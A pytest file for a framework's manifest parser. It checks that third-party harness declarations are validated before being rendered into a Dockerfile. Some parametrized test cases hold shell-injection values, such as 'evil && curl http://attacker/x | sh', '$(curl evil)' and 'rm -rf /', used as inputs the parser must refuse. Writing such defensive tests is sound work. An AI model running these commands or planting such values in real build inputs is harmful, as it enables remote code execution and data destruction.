"""Manifest parsing is the trust boundary for third-party ``di.json``.

It runs with no DB and no Python import (``module:validate`` must work before any schema
change), and its output is rendered into a Dockerfile — so every field is validated
against a closed schema rather than interpolated.
"""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from agento.framework.cli._provisioning import render_sandbox_dockerfile
from agento.framework.harness import (
    CredentialRegistrationMode,
    HarnessDescriptor,
    SandboxPackage,
    enumerate_harness_declarations,
    enumerate_sandbox_packages,
    parse_harness_declarations,
)

FIXTURES = Path(__file__).resolve().parents[3] / "fixtures" / "modules"


def _decl(**overrides) -> dict:
    base = {
        "id": "h",
        "label": "H",
        "class": "src.adapter.A",
        "default_provider": "p",
        "providers": [{"id": "p", "label": "P", "credential_required": False}],
    }
    base.update(overrides)
    return base


def _write_module(root: Path, name: str, di: dict) -> Path:
    mod = root / "app" / "code" / name
    mod.mkdir(parents=True)
    (mod / "module.json").write_text(json.dumps({"name": name, "version": "0.1.0"}))
    (mod / "di.json").write_text(json.dumps(di))
    return root


class TestDeclarationValidation:
    def test_missing_class_path_is_an_error_not_a_silent_skip(self, tmp_path):
        di = {"agent_harnesses": [{k: v for k, v in _decl().items() if k != "class"}]}
        (tmp_path / "di.json").write_text(json.dumps(di))
        with pytest.raises(ValueError, match="missing a 'class' path"):
            parse_harness_declarations(tmp_path / "di.json", "m")

    def test_absent_file_or_section_yields_nothing(self, tmp_path):
        assert parse_harness_declarations(tmp_path / "nope.json", "m") == []
        (tmp_path / "di.json").write_text(json.dumps({"observers": []}))
        assert parse_harness_declarations(tmp_path / "di.json", "m") == []

    def test_unparseable_json_raises(self, tmp_path):
        (tmp_path / "di.json").write_text("{not json")
        with pytest.raises(ValueError, match=r"unreadable di\.json"):
            parse_harness_declarations(tmp_path / "di.json", "m")

    @pytest.mark.parametrize("bad_id", [
        "shell injection; rm -rf /", "UPPER", "-leading-dash", "with/slash", "", "x" * 65,
    ])
    def test_harness_id_is_bounded_and_canonical(self, bad_id):
        """Ids land in ``credential.scope VARCHAR(64)`` and in Docker ARG names."""
        with pytest.raises(ValueError):
            HarnessDescriptor.from_declaration(_decl(id=bad_id))

    def test_default_provider_must_be_one_of_the_declared_providers(self):
        with pytest.raises(ValueError, match="default_provider"):
            HarnessDescriptor.from_declaration(_decl(default_provider="absent"))

    def test_providers_must_be_non_empty(self):
        with pytest.raises(ValueError, match="non-empty array"):
            HarnessDescriptor.from_declaration(_decl(providers=[]))

    def test_unknown_capability_is_rejected(self):
        with pytest.raises(ValueError, match="Unknown harness capabilities"):
            HarnessDescriptor.from_declaration(_decl(capabilities={"telepathy": True}))


class TestProviderConsistency:
    """``credential_required`` is the single source of truth; the other two fields must
    agree with it in BOTH directions, so a half-declared provider cannot load."""

    def test_required_without_scope_is_rejected(self):
        with pytest.raises(ValueError, match="needs a credential_scope"):
            HarnessDescriptor.from_declaration(_decl(providers=[
                {"id": "p", "credential_required": True, "registration_modes": ["api_key"]},
            ]))

    def test_required_without_modes_is_rejected(self):
        with pytest.raises(ValueError, match="registration_modes"):
            HarnessDescriptor.from_declaration(_decl(providers=[
                {"id": "p", "credential_required": True, "credential_scope": "s"},
            ]))

    def test_not_required_but_declaring_a_scope_is_rejected(self):
        with pytest.raises(ValueError, match="must not"):
            HarnessDescriptor.from_declaration(_decl(providers=[
                {"id": "p", "credential_required": False, "credential_scope": "s"},
            ]))

    def test_not_required_but_declaring_modes_is_rejected(self):
        with pytest.raises(ValueError, match="must not"):
            HarnessDescriptor.from_declaration(_decl(providers=[
                {"id": "p", "credential_required": False, "registration_modes": ["api_key"]},
            ]))

    def test_unknown_registration_mode_names_the_known_ones(self):
        with pytest.raises(ValueError, match="unknown registration mode"):
            HarnessDescriptor.from_declaration(_decl(providers=[
                {"id": "p", "credential_required": True, "credential_scope": "s",
                 "registration_modes": ["telepathy"]},
            ]))

    def test_fixture_harness_declares_two_modes(self):
        (decl,) = parse_harness_declarations(
            FIXTURES / "fake_harness" / "di.json", "fake_harness",
        )
        cloud = decl.descriptor.provider("fake_cloud")
        assert cloud.registration_modes == (
            CredentialRegistrationMode.API_KEY,
            CredentialRegistrationMode.ACCESS_TOKEN,
        )


class TestSandboxPackageSchema:
    """The declaration is rendered into a Dockerfile, so it must not be able to inject
    shell — validation happens before any string ever reaches the template."""

    @pytest.mark.parametrize("field,value", [
        ("package", "evil && curl http://attacker/x | sh"),
        ("package", "pkg; rm -rf /"),
        ("binary", "sh -c evil"),
        ("version_env_key", "lowercase"),
        ("version_env_key", "KEY; echo"),
        ("default_range", "$(curl evil)"),
        ("default_range", "latest"),
    ])
    def test_shell_metacharacters_are_refused(self, field, value):
        decl = {
            "manager": "npm", "package": "@ok/pkg", "binary": "ok",
            "version_env_key": "OK_VERSION", "default_range": "1.0.0",
        }
        decl[field] = value
        with pytest.raises(ValueError, match=r"refusing to render|non-empty"):
            SandboxPackage.from_declaration(decl, "h")

    def test_unsupported_manager_is_refused(self):
        with pytest.raises(ValueError, match="unsupported manager"):
            SandboxPackage.from_declaration({
                "manager": "curl-pipe-sh", "package": "@ok/pkg", "binary": "ok",
                "version_env_key": "OK_VERSION", "default_range": "1.0.0",
            }, "h")

    def test_malicious_fixture_module_is_rejected_wholesale(self):
        with pytest.raises(ValueError):
            parse_harness_declarations(FIXTURES / "bad_harness" / "di.json", "bad_harness")

    def test_third_party_package_renders_into_the_dockerfile(self):
        """A harness the framework never heard of gets its CLI installed — the whole
        point of moving the pin out of a hardcoded Dockerfile line."""
        (decl,) = parse_harness_declarations(
            FIXTURES / "fake_harness" / "di.json", "fake_harness",
        )
        template = (
            "FROM node:22\n"
            "# {{ sandbox_package_args }}\n"
            "# {{ sandbox_package_install }}\n"
        )

        rendered = render_sandbox_dockerfile(template, [decl.descriptor.sandbox_package])

        assert "ARG FAKE_CLI_VERSION=1.2.3" in rendered
        assert 'RUN npm install -g "@example/fake-cli@${FAKE_CLI_VERSION}"' in rendered
        # The ARG must stay expandable — quoting it with shlex.quote would break the pin.
        assert "'@example/fake-cli" not in rendered

    def test_zero_packages_removes_the_marker_lines(self):
        template = (
            "FROM node:22\n"
            "# {{ sandbox_package_args }}\n"
            "# {{ sandbox_package_install }}\n"
        )
        rendered = render_sandbox_dockerfile(template, [])
        assert "{{" not in rendered


class TestEnumeration:
    def test_local_module_harness_is_discovered(self, tmp_path):
        proj = _write_module(tmp_path, "hermes", {"agent_harnesses": [_decl(id="hermes")]})
        ids = {d.descriptor.id for d in enumerate_harness_declarations(proj)}
        assert "hermes" in ids
        assert {"claude", "codex"} <= ids  # core modules still contribute

    def test_duplicate_harness_id_across_modules_raises(self, tmp_path):
        proj = _write_module(tmp_path, "impostor", {"agent_harnesses": [_decl(id="claude")]})
        with pytest.raises(RuntimeError, match="duplicate harness id"):
            enumerate_harness_declarations(proj)

    def test_duplicate_credential_scope_across_modules_raises(self, tmp_path):
        proj = _write_module(tmp_path, "impostor", {"agent_harnesses": [_decl(
            id="impostor",
            providers=[{
                "id": "p", "credential_required": True, "credential_scope": "claude",
                "registration_modes": ["api_key"],
            }],
        )]})
        with pytest.raises(RuntimeError, match="duplicate credential_scope"):
            enumerate_harness_declarations(proj)

    def test_disabled_module_contributes_nothing(self, tmp_path):
        proj = _write_module(tmp_path, "hermes", {"agent_harnesses": [_decl(id="hermes")]})
        (proj / "app" / "etc").mkdir(parents=True, exist_ok=True)
        (proj / "app" / "etc" / "modules.json").write_text(json.dumps({"hermes": False}))

        ids = {d.descriptor.id for d in enumerate_harness_declarations(proj)}
        assert "hermes" not in ids

    def test_sandbox_packages_come_from_the_harness_section(self):
        keys = {p.version_env_key for p in enumerate_sandbox_packages()}
        assert {"CLAUDE_CODE_VERSION", "CODEX_VERSION"} <= keys
